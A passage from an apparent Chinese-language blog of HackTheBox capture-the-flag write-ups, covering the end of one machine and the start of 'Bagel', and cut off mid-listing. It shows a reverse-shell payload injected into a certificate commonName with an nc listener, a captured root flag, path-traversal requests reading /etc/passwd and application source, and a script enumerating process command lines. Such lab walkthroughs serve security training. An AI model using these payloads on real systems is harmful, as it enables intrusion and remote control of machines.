class="variable">$commonName</span>.crt&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br></pre></td></tr></table></figure><blockquote><p>This is a bash script that takes a path to a certificate file as its argument and checks if the certificate needs to be renewed. If it needs to be renewed, it generates a new certificate with the same subject and places it in a specific directory.<br />Here’s a brief rundown of what the script does:</p><ol><li>The script checks if the correct number of arguments have been provided and prints a usage message if they haven’t.</li><li>It then checks if the certificate file exists, and if it doesn’t, it prints an error message and exits.</li><li>If the certificate file exists, the script checks if the certificate needs to be renewed by using the openssl command to check if the certificate is still valid for at least 24 hours (86400 seconds) using the -checkend option. If the certificate doesn’t need to be renewed, it prints a message and exits.</li><li>If the certificate needs to be renewed, the script extracts the subject fields from the certificate using the openssl command and assigns them to variables for later use.</li><li>The script then prints the subject fields to the console.</li><li>It then generates a new certificate using the openssl command with the req subcommand to generate a self-signed certificate. The certificate is generated with a validity period of 365 days, a key length of 4096 bits, and the same subject fields as the original certificate.</li><li>Finally, the script moves the newly generated certificate to a specific directory with the filename as the common name extracted from the subject of the original certificate, followed by the .crt extension.<br />– Generated By ChatGPT</li></ol></blockquote><p>构造一个24小时后过期的证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/bfl.key -out /tmp/bfl.crt -days 1</span><br><span class="line">cp /tmp/bfl.crt /home/bill/Certs/broscience.crt</span><br></pre></td></tr></table></figure><p>其中在<code>commonName</code>字段填入如下Payload <code>$(bash -i &gt;&amp; /dev/tcp/10.10.*.*/9995 0&gt;&amp;1)</code></p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><p>执行计划任务触发反弹Shell</p><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc289e7710721538f1ae8054f35af549</span><br></pre></td></tr></table></figure><hr /><p>一开始把5432端口的数据库当成Mysql了，弄半天连不上还以为是端口转发工具的问题，难绷</p><hr /><h1 id="hackthebox_bagel"><a class="markdownIt-Anchor" href="#hackthebox_bagel"></a> HackTheBox_Bagel</h1><h2 id="信息收集-13"><a class="markdownIt-Anchor" href="#信息收集-13"></a> 信息收集</h2><h3 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.201</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.201</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)</span><br><span class="line">5000&#x2F;tcp open  upnp?</span><br><span class="line">8000&#x2F;tcp open  http-alt Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port5000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C8%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft</span><br><span class="line">SF:-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:31\x20GMT\</span><br><span class="line">SF:r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest,E8,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-N</span><br><span class="line">SF:etCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:32\x20GMT\r\</span><br><span class="line">SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r</span><br><span class="line">SF:\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)</span><br><span class="line">SF:\.\)&lt;&#x2F;h1&gt;&quot;)%r(HTTPOptions,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nSer</span><br><span class="line">SF:ver:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2</span><br><span class="line">SF:005:42:48\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(Help,E6,&quot;HTTP&#x2F;1\.1</span><br><span class="line">SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20M</span><br><span class="line">SF:icrosoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00</span><br><span class="line">SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:</span><br><span class="line">SF:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\</span><br><span class="line">SF:(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(SSLSessionReq,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Requ</span><br><span class="line">SF:est\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\</span><br><span class="line">SF:r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00\x20GMT\r\nContent-Len</span><br><span class="line">SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Ba</span><br><span class="line">SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(</span><br><span class="line">SF:TerminalServerCookie,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-</span><br><span class="line">SF:Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat</span><br><span class="line">SF:,\x2025\x20Mar\x202023\x2005:43:01\x20GMT\r\nContent-Length:\x2052\r\nC</span><br><span class="line">SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x2</span><br><span class="line">SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(TLSSessionReq,E</span><br><span class="line">SF:6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\n</span><br><span class="line">SF:Server:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023</span><br><span class="line">SF:\x2005:43:02\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\</span><br><span class="line">SF:nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\</span><br><span class="line">SF:x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port8000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C3%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,1EA,&quot;HTTP&#x2F;1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug&#x2F;2\.2\.2\</span><br><span class="line">SF:x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:26\x2</span><br><span class="line">SF:0GMT\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:</span><br><span class="line">SF:\x20263\r\nLocation:\x20http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\r\nCo</span><br><span class="line">SF:nnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title</span><br><span class="line">SF:&gt;Redirecting\.\.\.&lt;&#x2F;title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;&#x2F;h1&gt;\n&lt;p&gt;You\x20shoul</span><br><span class="line">SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x</span><br><span class="line">SF:20&lt;a\x20href&#x3D;\&quot;http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\&quot;&gt;http:&#x2F;&#x2F;bagel</span><br><span class="line">SF:\.htb:8000&#x2F;\?page&#x3D;index\.html&lt;&#x2F;a&gt;\.\x20If\x20not,\x20click\x20the\x20li</span><br><span class="line">SF:nk\.\n&quot;)%r(FourOhFourRequest,184,&quot;HTTP&#x2F;1\.1\x20404\x20NOT\x20FOUND\r\nS</span><br><span class="line">SF:erver:\x20Werkzeug&#x2F;2\.2\.2\x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x2</span><br><span class="line">SF:0Mar\x202023\x2005:42:32\x20GMT\r\nContent-Type:\x20text&#x2F;html;\x20chars</span><br><span class="line">SF:et&#x3D;utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doc</span><br><span class="line">SF:type\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;&#x2F;title&gt;\n&lt;</span><br><span class="line">SF:h1&gt;Not\x20Found&lt;&#x2F;h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found</span><br><span class="line">SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu</span><br><span class="line">SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;&#x2F;p</span><br><span class="line">SF:&gt;\n&quot;)%r(Socks5,213,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTM</span><br><span class="line">SF:L\x204\.01&#x2F;&#x2F;EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http:&#x2F;&#x2F;www\.w3\.org</span><br><span class="line">SF:&#x2F;TR&#x2F;html4&#x2F;strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20&lt;meta\x20http-equiv&#x3D;\&quot;Content-Type\&quot;\x20content&#x3D;\&quot;te</span><br><span class="line">SF:xt&#x2F;html;charset&#x3D;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\</span><br><span class="line">SF:x20response&lt;&#x2F;title&gt;\n\x20\x20\x20\x20&lt;&#x2F;head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;&#x2F;h1&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\\x05\\x04\\x0</span><br><span class="line">SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20</span><br><span class="line">SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;&#x2F;p&gt;\n\x2</span><br><span class="line">SF:0\x20\x20\x20&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;);</span><br></pre></td></tr></table></figure><h3 id="路径枚举-9"><a class="markdownIt-Anchor" href="#路径枚举-9"></a> 路径枚举</h3><p>获得域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.201:8000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">Date: Sat, 25 Mar 2023 05:42:27 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 263</span><br><span class="line">Location: http:&#x2F;&#x2F;bagel.htb:8000&#x2F;?page&#x3D;index.html</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.201\tbagel.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>8000端口 Python Web服务<br />5000端口直接400<br />扫个锤子的路径</p><h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2><p>重定向到<code>http://bagel.htb:8000/?page=index.html</code></p><p>LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:59:59:Account used for TPM access:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-oom:x:999:999:systemd Userspace OOM Killer:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">polkitd:x:998:997:User for polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin</span><br><span class="line">abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin</span><br><span class="line">setroubleshoot:x:997:995:SELinux troubleshoot server:&#x2F;var&#x2F;lib&#x2F;setroubleshoot:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-ws:x:996:994:User for cockpit web service:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-wsinstance:x:995:993:User for cockpit-ws instances:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;share&#x2F;empty.sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">chrony:x:994:992::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:&#x2F;var&#x2F;lib&#x2F;dnsmasq:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:989:989:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:988:988:systemd Time Synchronization:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">developer:x:1000:1000::&#x2F;home&#x2F;developer:&#x2F;bin&#x2F;bash</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:987:987::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>尝试读取WEB代码文件</p><p><del><a href="http://app.py">app.py</a> or <a href="http://index.py">index.py</a> or <a href="http://main.py">main.py</a></del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../app.py</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, redirect, Response</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> websocket,json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;page&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">            page = <span class="string">&#x27;static/&#x27;</span>+request.args.get(<span class="string">&#x27;page&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(page):</span><br><span class="line">                resp=send_file(page)</span><br><span class="line">                resp.direct_passthrough = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> os.path.getsize(page) == <span class="number">0</span>:</span><br><span class="line">                    resp.headers[<span class="string">&quot;Content-Length&quot;</span>]=<span class="built_in">str</span>(<span class="built_in">len</span>(resp.get_data()))</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;http://bagel.htb:8000/?page=index.html&#x27;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/orders&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span> <span class="comment"># don&#x27;t forget to run the order app first with &quot;dotnet &lt;path to .dll&gt;&quot; command. Use your ssh key to access the machine.</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ws = websocket.WebSocket()    </span><br><span class="line">        ws.connect(<span class="string">&quot;ws://127.0.0.1:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">        order = &#123;<span class="string">&quot;ReadOrder&quot;</span>:<span class="string">&quot;orders.txt&quot;</span>&#125;</span><br><span class="line">        data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">        ws.send(data)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="keyword">return</span>(json.loads(result)[<span class="string">&#x27;ReadOrder&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&quot;Unable to connect&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>这里提到dll文件和SSH key</p><p>编写<code>cmdline.py</code>如下，用于枚举进程命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmdline.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://bagel.htb:8000/?page=../../../../proc/%d/cmdline&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2000</span>):</span><br><span class="line">res = req.get(url % _)</span><br><span class="line">print(<span class="string">&quot;%s: %s&quot;</span> % (_, res.text))</span><br></pre></td></tr></table></figure><p>找到一个相关命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">891: dotnet&#x2F;opt&#x2F;bagel&#x2F;bin&#x2F;Debug&#x2F;net6.0&#x2F;bagel.dll</span><br></pre></td></tr></table></figure><p><code>/proc/$pid/cmdline</code>中<code>\x20</code>会变成<code>\x00</code></p><p>所以原始命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll</span><br></pre></td></tr></table></figure><p>获取bagel.dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o /tmp/bagel.dll</span><br></pre></td></tr></table></figure><p>官方论坛上有人提到<code>ilspycmd</code></p><blockquote><p>dotnet tool install --global ilspycmd --version 7.2.1.6856</p></blockquote><p>但是我以global安装后ilspycmd没有出现在PATH路径下<br />懒得找了，以local方式安装吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dotnet new tool-manifest</span><br><span class="line">dotnet tool install ilspycmd</span><br><span class="line">dotnet tool run ilspycmd /tmp/bagel.dll</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 